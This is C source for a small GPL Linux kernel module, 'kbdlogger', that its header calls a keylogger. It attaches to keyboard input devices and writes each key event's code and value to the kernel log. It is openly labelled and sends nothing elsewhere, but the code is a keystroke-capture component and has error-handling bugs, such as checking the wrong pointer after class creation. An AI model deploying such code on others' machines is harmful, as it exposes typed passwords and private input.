/*
 * kbdlogger driver
 *
 * Copyright (C) 2014 Rafael do Nascimento Pereira <rnp@25ghz.net>
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * Keylogger driver - capture keypress events
 *
 */

#define pr_fmt(fmt) KBUILD_MODNAME ": " fmt


#include <linux/init.h>
#include <linux/module.h>
#include <linux/input.h>
#include <linux/device.h>
#include <linux/slab.h>
#include <linux/types.h>
#include <linux/fs.h>
#include <linux/cdev.h>
#include <linux/kobject.h>
#include <asm/uaccess.h>

MODULE_AUTHOR("Rafael do Nascimento Pereira <rnp@25ghz.net>");
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Input driver keyboard logger");

#define NUMDEVS  1
#define DEVNAME  "kbdlogger"

const char *kbdstr = "keyboard";

struct kobject kobj;
struct class   *kbdclass;
struct device  *kbddev;
dev_t    devnum;
uint64_t pressev;
uint64_t relev;
uint64_t autorepev;
char     *starttime;

static int __init kbdlogger_init(void);

static void __exit kbdlogger_exit(void);

static int kbdlogger_connect(struct input_handler *handler, struct input_dev *dev,
		const struct input_device_id *id)
{
	struct input_handle *handle;
	int error;
	struct device *device;

	if (strstr(dev->name, kbdstr)) {

		handle = kzalloc(sizeof(struct input_handle), GFP_KERNEL);
		if (!handle)
			return -ENOMEM;

		handle->dev = dev;
		handle->handler = handler;
		handle->name = "kbdlogger";
		error = input_register_handle(handle);

		if (error)
			goto err_free_handle;

		error = input_open_device(handle);
		if (error)
			goto err_unregister_handle;

		printk(KERN_DEBUG pr_fmt("Connected device: %s (%s at %s)\n"),
			dev_name(&dev->dev),
			dev->name ?: "unknown",
			dev->phys ?: "unknown");

		device = &dev->dev;
		printk(KERN_DEBUG pr_fmt("dev->dev->init_name: %s\ndevice type: %s\n"),
			device->init_name  ?: "unknown",
			device->type->name ?: "unknown");
	}

	return 0;

err_unregister_handle:
	input_unregister_handle(handle);
err_free_handle:
	kfree(handle);
	return error;
}

static void kbdlogger_event(struct input_handle *handle, unsigned int type,
			unsigned int code, int value)
{
	if (type == EV_KEY) {
		printk(KERN_DEBUG pr_fmt("Key event. Dev: %s, Type: %d, Code: %d, Value: %d\n"),
		dev_name(&handle->dev->dev), type, code, value);
	}
}


static void kbdlogger_disconnect(struct input_handle *handle)
{
	printk(KERN_DEBUG pr_fmt("Disconnected device: %s\n"),
		dev_name(&handle->dev->dev));

	input_close_device(handle);
	input_unregister_handle(handle);
	kfree(handle);
}

static const struct input_device_id kbdlogger_ids[] = {
	{.driver_info = 1 },  /* driver_info = 1 ??  */
	{},
};

MODULE_DEVICE_TABLE(input, kbdlogger_ids);

static struct input_handler kbdlogger_handler = {
	.connect    = kbdlogger_connect,
	.disconnect = kbdlogger_disconnect,
	.event      = kbdlogger_event,
	.id_table   = kbdlogger_ids,
	.name       = "kbdlogger",
};

static void __exit kbdlogger_exit(void)
{
	input_unregister_handler(&kbdlogger_handler);
	unregister_chrdev_region(devnum, NUMDEVS);
	device_destroy(kbdclass, devnum);
	class_destroy(kbdclass);
}

static int __init kbdlogger_init(void)
{
	int ret;
	int minor = 0;
	int major = 0;

	ret = alloc_chrdev_region(&devnum, minor, NUMDEVS, DEVNAME);
	major = MAJOR(devnum);

	if (ret < 0) {
		printk(KERN_ERR "[%s] can't get major %d\n", DEVNAME, major);
		ret = -ENOMEM;
		goto fail;
	}

	kbdclass = class_create(THIS_MODULE, "logger");
	if (IS_ERR(kbddev)) {
		printk(KERN_DEBUG "Failed creating class\n");
		ret = -ENOMEM;
		goto fail;
	}

	kbddev = device_create(kbdclass,
			NULL, devnum, NULL, DEVNAME);

	if (input_register_handler(&kbdlogger_handler)) {
		printk(KERN_DEBUG "Failed creating class\n");
		ret = -ENOMEM;
		goto fail;
	}

	kobj.parent = &kbddev->kobj;
	if(kobject_set_name(&kobj, "kbdlogger"))
		goto fail;

	return 0;
fail:
	kbdlogger_exit();
	return ret;
}

module_init(kbdlogger_init);
module_exit(kbdlogger_exit);
